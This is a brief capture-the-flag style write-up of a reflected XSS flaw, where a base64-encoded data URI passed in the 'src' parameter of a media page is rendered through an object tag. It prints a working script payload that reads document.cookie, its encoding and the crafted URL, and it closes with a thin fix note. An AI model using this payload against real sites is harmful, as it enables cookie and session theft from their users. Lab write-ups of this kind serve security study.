# data URI XSS
/?page=media&src=nsa

## What is data URI
Data URI, defined by RFC 2397, is a smart way of embedding small files in line in HTML documents. Instead of linking to a file stored locally on the server, the file is provided within the URL itself as a base64-encoded string of data preceded by a mime-type.

## How to get flag
By inspecting image, we can find image is rendered by object tag. It shows depends on which src params. 

Encode script code with base64.
```
base64 encoding
<script>alert(document.cookie)</script>
PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+
```

And Make url like below.
```
/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ
```

## Vulnerability
Attacker make data uri link and send to others. The moment someone click link, malcious script exploit his info.

## How to Fix
Don't use object and embed tag. It is vulnarable from XSS.

## Resouces
(Testing for Reflected Cross Site Scripting)[https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html]
(base64 encode-decode)[https://www.motobit.com/util/base64-decoder-encoder.asp]